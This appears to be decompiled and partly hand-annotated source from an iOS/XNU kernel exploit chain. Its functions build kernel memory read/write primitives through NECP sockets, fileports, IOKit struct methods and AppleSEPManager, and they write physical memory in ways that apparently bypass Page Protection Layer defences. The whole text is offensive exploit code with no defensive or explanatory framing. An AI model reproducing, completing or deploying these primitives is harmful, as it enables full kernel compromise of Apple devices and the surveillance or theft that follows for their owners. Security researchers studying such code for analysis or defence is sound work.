//----- (000000000002AB18) ----------------------------------------------------
__int64 __fastcall necp_socket_fileport_setup(struct_krwCtx *krwCtx)
{
  __int64 v1; // x22
  int v3; // w0
  int v4; // w20
  int v5; // w21
  int v6; // w8
  int v7; // w21
  bool v8; // zf
  int v9; // w20
  __int64 v10; // x8
  int v12; // w19
  int v13; // w8
  struct sockaddr v14; // [xsp+0h] [xbp-50h] BYREF
  __int128 v15; // [xsp+10h] [xbp-40h]
  __int64 v16; // [xsp+20h] [xbp-30h] BYREF
  mach_port_t v17; // [xsp+2Ch] [xbp-24h]

  v1 = krwCtx->semaphoreHelperCtx;
  if ( !v1 )
    return 0;
  v17 = 0;
  v3 = socket(32, 2, 2);
  v4 = v3;
  if ( v3 < 0
    || (v14 = (struct sockaddr){0}, v15 = 0u, *(uint32_t *)&v14.sa_data[2] = 2, connect(v3, &v14, 0x20u))
    || (unsigned int)((__int64 (__cdecl *)())j__fileport_makeport)() )
  {
    v5 = errno;
    v6 = errno;
    if ( v5 < 0 )
      v6 = -v6;
    v7 = v6 | 0x40000000;
    goto LABEL_8;
  }
  v7 = get_task_bsd_info_kaddr(krwCtx, v17, &v16);
  if ( !v7 )
  {
    v7 = 163855;
    if ( kread_physmap_decorated(krwCtx, v16 + 16, (unsigned __int64 *)&v16) )
    {
      if ( !validate_kaddr_range(krwCtx, v16) )
        goto LABEL_40;
      if ( kread_physmap_decorated(krwCtx, v16 + 48, (unsigned __int64 *)&v16) )
      {
        if ( validate_kaddr_range(krwCtx, v16) )
        {
          v7 = 0;
          *(uint32_t *)(v1 + 16) = v4;
          *(uint64_t *)(v1 + 24) = v16;
          goto LABEL_8;
        }
LABEL_40:
        v7 = 163878;
      }
    }
  }
LABEL_8:
  if ( v17 + 1 >= 2 )
  {
    mach_port_deallocate(mach_task_self_, v17);
    v17 = 0;
  }
  if ( v7 )
    v8 = v4 == -1;
  else
    v8 = 1;
  if ( !v8 )
  {
    close(v4);
    *(uint32_t *)(v1 + 60) = v7;
LABEL_26:
    semaphore_signal(*(uint32_t *)(v1 + 12));
    return 0;
  }
  *(uint32_t *)(v1 + 60) = v7;
  if ( v7 )
    goto LABEL_26;
  v9 = 708609;
  while ( !(unsigned int)__semwait_signal() )
  {
    if ( *(uint8_t *)(v1 + 56) )
    {
      v9 = 0;
      goto LABEL_38;
    }
    v10 = *(uint64_t *)(v1 + 32);
    if ( !v10 || !*(uint64_t *)(v1 + 40) || *(uint64_t *)(v1 + 48) != 8 )
      goto LABEL_38;
    *(uint64_t *)&v14.sa_len = v10 - 48;
    if ( noppl_kwritebuf(krwCtx, *(uint64_t *)(v1 + 24) + 8LL, &v14, krwCtx->stride_0x168, 1) )
    {
      v16 = **(uint64_t **)(v1 + 40);
      if ( setsockopt(*(uint32_t *)(v1 + 16), 2, 16, &v16, 8u) )
        break;
      *(uint64_t *)&v14.sa_len = 0;
      if ( noppl_kwritebuf(krwCtx, *(uint64_t *)(v1 + 24) + 8LL, &v14, krwCtx->stride_0x168, 1) )
        continue;
    }
    v9 = 163856;
    goto LABEL_38;
  }
  v12 = errno;
  v13 = errno;
  if ( v12 < 0 )
    v13 = -v13;
  v9 = v13 | 0x40000000;
LABEL_38:
  *(uint32_t *)(v1 + 60) = v9;
  if ( !*(uint8_t *)(v1 + 56) )
    goto LABEL_26;
  return 0;
}

//----- (000000000002AD98) ----------------------------------------------------
__int64 __fastcall semaphore_wait_wrapper(semaphore_t a1)
{
  semaphore_wait(a1);
  return 0;
}

//----- (000000000002ADB4) ----------------------------------------------------
__int64 __fastcall semaphore_mem_acquire_thread(__int64 a1)
{
  semaphore_t v2; // w19
  pthread_mutex_t *v3; // x20
  __int64 v4; // x26
  char v5; // w25
  char v6; // w8
  unsigned int v7; // w27
  __int64 v8; // x22
  unsigned int v9; // w0
  unsigned int v10; // w23
  __int64 v11; // x8
  __int64 v12; // x24
  __int64 v13; // x23
  __int64 v14; // x28
  __int64 v15; // x8
  vm_address_t v16; // x8
  vm_size_t v17; // x24
  mem_entry_name_port_t v18; // w5
  vm_offset_t v19; // x6
  unsigned __int64 v20; // x9
  vm_size_t v21; // x23
  vm_address_t address; // [xsp+18h] [xbp-58h] BYREF

  v2 = *(uint32_t *)(a1 + 136);
  v3 = (pthread_mutex_t *)(a1 + 32);
  v4 = *(uint64_t *)(a1 + 104);
  if ( !v4 )
  {
    v5 = 0;
    v6 = 0;
    v7 = 0;
    v8 = *(uint64_t *)a1;
    while ( (v6 & 1) == 0 || !pthread_mutex_unlock(v3) )
    {
      if ( v7 )
        thread_switch(0, 2, 1u);
      if ( pthread_mutex_lock(v3) )
      {
        ++*(uint32_t *)(a1 + 120);
        goto LABEL_40;
      }
      if ( !*(uint64_t *)(a1 + 104) )
      {
        v9 = get_page_size();
        if ( v9 < *(uint32_t *)(a1 + 16) )
        {
          v10 = v9;
          v11 = *(uint64_t *)(*(uint64_t *)(a1 + 8) + 8LL * v9);
          if ( v11 )
          {
            v12 = *(uint64_t *)(v11 + *(unsigned int *)(a1 + 20));
            if ( validate_kaddr_range(v8, v12) )
            {
              if ( v10 == (unsigned int)get_page_size() )
              {
                v13 = v12 + *(unsigned int *)(a1 + 96);
                v14 = v13 & ~*(uint64_t *)(v8 + 392);
                v15 = *(uint64_t *)(a1 + 24);
                if ( v15 && v14 == v15 )
                  break;
                if ( !check_kaddr_in_physmap((struct_krwCtx *)v8, v12 + *(unsigned int *)(a1 + 96)) )
                {
LABEL_37:
                  *(uint64_t *)(a1 + 24) = v14;
                  break;
                }
                v16 = *(uint64_t *)(v8 + 144);
                if ( !v16 || (v17 = *(uint64_t *)(v8 + 152)) == 0 )
                {
                  address = 0;
                  v18 = *(uint32_t *)(v8 + 88);
                  if ( v18 + 1 < 2 )
                    goto LABEL_37;
                  v19 = *(uint64_t *)(v8 + 128);
                  if ( !v19 )
                    goto LABEL_37;
                  v17 = *(unsigned int *)(v8 + 136);
                  if ( !(uint32_t)v17 || vm_map(mach_task_self_, &address, v17, 0, 1, v18, v19, 0, 1, 1, 1u) )
                    goto LABEL_37;
                  v16 = address;
                  *(uint64_t *)(v8 + 144) = address;
                  *(uint64_t *)(v8 + 152) = v17;
                }
                v20 = 0;
                while ( !*(uint32_t *)(v16 + (unsigned int)(v20 + 32))
                     || *(uint64_t *)(v16 + (unsigned int)(v20 + 24)) != v14 )
                {
                  v20 += 48LL;
                  if ( v17 <= (unsigned int)v20 )
                    goto LABEL_37;
                }
                v21 = (*(uint64_t *)(v8 + 392) & v13)
                    + ((((*(uint64_t *)(v8 + 128) + *(unsigned int *)(v8 + 136) + vm_page_size - 1)
                       & -(__int64)vm_page_size) >> vm_page_shift)
                     + v20 / 0x30)
                    * vm_page_size;
                *(uint64_t *)(a1 + 104) = pthread_self();
                *(uint64_t *)(a1 + 112) = v21;
                v5 = 1;
              }
            }
          }
        }
      }
      if ( !*(uint64_t *)(a1 + 104) )
      {
        v6 = 1;
        if ( v7++ < 0xF )
          continue;
      }
      goto LABEL_3;
    }
    ++*(uint32_t *)(a1 + 120);
    goto LABEL_39;
  }
  v5 = 0;
LABEL_3:
  ++*(uint32_t *)(a1 + 120);
  if ( !v4 )
LABEL_39:
    pthread_mutex_unlock(v3);
LABEL_40:
  if ( (v5 & 1) != 0 )
    semaphore_wait(v2);
  return 0;
}

//----- (000000000002B03C) ----------------------------------------------------
__int64 __fastcall ulock_wait_loop(__int64 a1)
{
  unsigned int v2; // w21
  int v3; // w0

  __error();
  v2 = 0;
  *(uint8_t *)(a1 + 73) = 1;
  while ( 1 )
  {
    v3 = __ulock_wait(0x10001u, (void *)(a1 + 52), 0, *(uint32_t *)(a1 + 52));
    if ( !v3 )
    {
      ++*(uint64_t *)(a1 + 64);
      goto LABEL_10;
    }
    if ( v3 == -1 && errno == 4 && v2++ < 0x64 )
      continue;
    if ( errno != 14 )
      return 0;
LABEL_10:
    v2 = 0;
    if ( *(uint8_t *)(a1 + 72) )
      return 0;
  }
}

//----- (000000000002B0E8) ----------------------------------------------------
kern_return_t ioconnect_struct_method_kwrite(struct_krwCtx *krwCtx, uint64_t vaddr, uint64_t a3)
{
    // [x0+0x1d48] = pointer to IOKit connection info struct
    struct_IOKitConnInfo *connInfo = krwCtx->IOKitConnInfo; // [krwCtx+0x1d48]
    if (!connInfo)
        return 0xAD001;  // 708609: no connection

    // w26 = 0x20026 = base error code
    // w21 = connection port (dword at +0x70)
    mach_port_t ioPort = connInfo->ioPort;     // [connInfo+0x70]
    if ((uint32_t)(ioPort + 1) < 2)
        return 0x20026 - 0x1e;  // 0x20008 = 131080: invalid port

    uint64_t qword58 = connInfo->qword58;      // slot table base or similar
    if (!qword58)  return 0x20026;             // 131110
    uint64_t qword60 = connInfo->qword60;      // paddr target 1
    if (!qword60)  return 0x20026;
    uint64_t qword68 = connInfo->qword68;      // x27: some pointer/table
    if (!qword68)  return 0x20026;
    uint64_t qword50 = connInfo->qword50;      // x8: used in inputStruct
    if (!qword50)  return 0x20026 - 0x15;      // 0x20011 = 131089

    // --- Build inputStruct at [sp+0x138], size 0x100 ---
    // Zero entire 0x100-byte region first (the stur q0 block)
    uint8_t inputStruct[0x100];
    memset(inputStruct, 0, sizeof(inputStruct));
    *(uint32_t *)&inputStruct[0] = 0x80;  // str w10,[sp+0x138] = 128

    // Version-dependent field offsets within inputStruct
    // csel chain: if xnuMajorVersion > 0x225B: offsets +8 each
    uint64_t vm_pgsz = vm_page_size;           // x9 = vm_page_size global
    int off0, off1, off2, off3;
    if (krwCtx->xnuMajorVersion > 0x225B) {
        off0 = 0x30; off1 = 0x38; off2 = 0x40; off3 = 0x48;
    } else {
        off0 = 0x28; off1 = 0x30; off2 = 0x38; off3 = 0x40;
    }
    *(uint64_t *)&inputStruct[off0] = vm_pgsz;  // str x9,[x15,x10]
    *(uint64_t *)&inputStruct[off1] = qword50;  // str x8,[x15,x12]
    *(uint64_t *)&inputStruct[off2] = qword50;  // str x8,[x15,x13]
    *(uint64_t *)&inputStruct[off3] = vm_pgsz;  // str x9,[x15,x14]

    // outputStruct at [sp+0x30], size 0x100
    uint8_t outputStruct[0x100];
    memset(outputStruct, 0, sizeof(outputStruct));
    size_t outputStructCnt = 0x100;

    kern_return_t kr = IOConnectCallStructMethod(
        ioPort, 9,
        inputStruct, 0x100,
        outputStruct, &outputStructCnt);
    if (kr)
        return kr | 0x80000000;

    // Result field at outputStruct[0x1c] (sp+0x4c = sp+0x30+0x1c)
    uint32_t result_idx = *(uint32_t *)&outputStruct[0x1c];  // w28

    // Validate: result_idx must be in [1, 0x3ff]
    if ((uint32_t)(result_idx - 1) > 0x3FE)
        return 0x20026 - 0x15;  // 131089

    // kreadbuf: read one element from qword68 table at result_idx
    // stride = krwCtx->stride_0x168 (ldrsw = signed word)
    int32_t  stride  = krwCtx->stride_0x168;  // [krwCtx+0x168]
    uint64_t tbl_ptr = qword68 + (uint32_t)(stride * result_idx);
    uint64_t kaddr   = 0;

    if (!kreadbuf_universal(krwCtx, tbl_ptr, stride, &kaddr, 0))
        return 0x20026 - 0x17;  // 0x2000F = 131087

    // w26 updated: w26 = 0x20026 - 0x17 = 0x2000F (used as error below)

    // Translate/canonicalize kaddr
    kaddr = maybe_sptm_translate_kaddr(krwCtx, kaddr);

    if (!validate_kaddr_range(krwCtx, kaddr))
        return 0x20026;  // 131110

    // Get physical address of kaddr+0x10
    uint64_t paddr1 = kaddr_to_phys_v2(krwCtx, kaddr + 0x10, 0);
    if (!paddr1)
        return 0x20026;

    // Check if kaddr+0x10 and kaddr+0x78 are in same physical page
    // bics xzr, ((kaddr+0x10)^(kaddr+0x78)), ~krwCtx->page_mask
    // b.eq → same page (no second kaddr_to_phys_v2 needed)
    uint64_t paddr2;
    if (((kaddr + 0x10) ^ (kaddr + 0x78)) & ~krwCtx->pageMask) {
        // Different pages — get separate paddr for kaddr+0x78
        paddr2 = kaddr_to_phys_v2(krwCtx, kaddr + 0x78, 0);  // x1 used at +548
        if (!paddr2)
            return 0x20026;
        // paddr2 stored at [sp+0x0]
    } else {
        // Same page — kaddr+0x78 = paddr1 + 0x68
        paddr2 = paddr1 + 0x68;
        // stored at [sp+0x0]
    }

    // Write 0 to paddr1 (4 bytes) using appropriate physical write method
    uint32_t zero_val = 0;
    uint64_t version_threshold = XNU_VERSION_PACKED(10002, 60, 75, 0, 3);
    if (krwCtx->xnuVersionPacked >= version_threshold
        && (*(uint8_t *)krwCtx & 0x20)) {  // tbnz w8, #5 → bit 5 of krwCtx[0]
        kr = physwritebuf_direct_mapped(krwCtx, paddr1, &zero_val, 4, 0);
    } else {
        kr = dmaFail_physwritebuf_ppl(krwCtx, paddr1, &zero_val, 4);
    }
    if (kr) return kr;

    // Read 8 bytes from vaddr
    uint64_t vaddr_val = 0;
    if (!kreadbuf_universal(krwCtx, vaddr, 8, &vaddr_val, 0))
        return 0x2000F;  // 131087

    // Write (vaddr_val - a3) to paddr2
    kr = physwrite64_maybe(krwCtx, paddr2, vaddr_val - a3);
    if (kr) return kr;

    // Write vaddr to qword60
    kr = physwrite64_maybe(krwCtx, qword60, vaddr);
    if (kr) return kr;

    // IOConnectCallScalarMethod(ioPort, 10, &result_idx, 1, NULL, NULL)
    uint64_t scalar_in = result_idx;
    IOConnectCallScalarMethod(ioPort, 10, &scalar_in, 1, NULL, NULL);

    // Final: restore qword60 → qword58
    return physwrite64_maybe(krwCtx, qword60, qword58);
}
// 2B3CC: variable 'v23' is possibly undefined
// 2B400: variable 'v24' is possibly undefined
// 2B418: variable 'v25' is possibly undefined
// 2B450: variable 'v26' is possibly undefined

#include "entry1_type0x09_dmafail_ppl.m"

//----- (000000000002B5BC) ----------------------------------------------------
__int64 __fastcall necp_ioservice_auth_write(struct_krwCtx *krwCtx, __int64 a2)
{
  unsigned int v4; // w22
  unsigned int v5; // w0
  __int64 v6; // x19
  unsigned __int64 v7; // x0
  mach_vm_address_t someKernelAddress; // x23
  unsigned int v9; // w0
  unsigned int v10; // w24
  int v11; // w0
  int is_the_kwrite64; // w0
  unsigned int v13; // w8
  __int64 v15; // [xsp+8h] [xbp-38h] BYREF

  v4 = krwCtx->iosurfaceObj;
  if ( v4 + 1 <= 1 )
  {
    v5 = ioservice_get_matching("AppleSEPManager");
    if ( v5 + 1 < 2 )
      return 708625;
    v4 = v5;
    krwCtx->iosurfaceObj = v5;
  }
  v6 = 163856;
  v7 = krwCtx->gap_0x18;
  if ( !v7 )
  {
    v7 = get_task_kobject_addr(krwCtx, v4);
    if ( !v7 )
      return 163854;
    krwCtx->gap_0x18 = v7;
  }
  if ( krwCtx->gap_0x20 )
  {
    v15 = krwCtx->gap_0x20;
    someKernelAddress = v7 + 40;
  }
  else
  {
    someKernelAddress = v7 + 40;
    if ( !kread_physmap_decorated(krwCtx, v7 + 40, (unsigned __int64 *)&v15) )
      return 163855;
    krwCtx->gap_0x20 = v15;
  }
  if ( kwrite64_last_arg(krwCtx, someKernelAddress, a2, 0) )
  {
    v9 = _IOServiceSetAuthorizationID();
    v10 = v9;
    if ( v9 )
    {
      if ( v9 != 53 )
      {
        v10 = (v9 & 0xFFF) | 0x70000000;
        goto LABEL_25;
      }
      if ( krwCtx->gap_0xC )
      {
        krwCtx->gap_0xC = 0;
        v10 = refresh_target_task_port(krwCtx, mach_task_self_, 0, 0);
        krwCtx->gap_0xC = 1;
        if ( v10 )
          goto LABEL_25;
      }
      else
      {
        v10 = refresh_target_task_port(krwCtx, mach_task_self_, 0, 0);
        if ( v10 )
          goto LABEL_25;
      }
      v11 = _IOServiceSetAuthorizationID();
      if ( v11 )
        v10 = (v11 & 0xFFF) | 0x70000000;
      else
        v10 = 0;
    }
LABEL_25:
    is_the_kwrite64 = kwrite64_last_arg(krwCtx, someKernelAddress, v15, 0);
    if ( v10 )
      v13 = v10;
    else
      v13 = 163856;
    if ( is_the_kwrite64 )
      return v10;
    else
      return v13;
  }
  return v6;
}
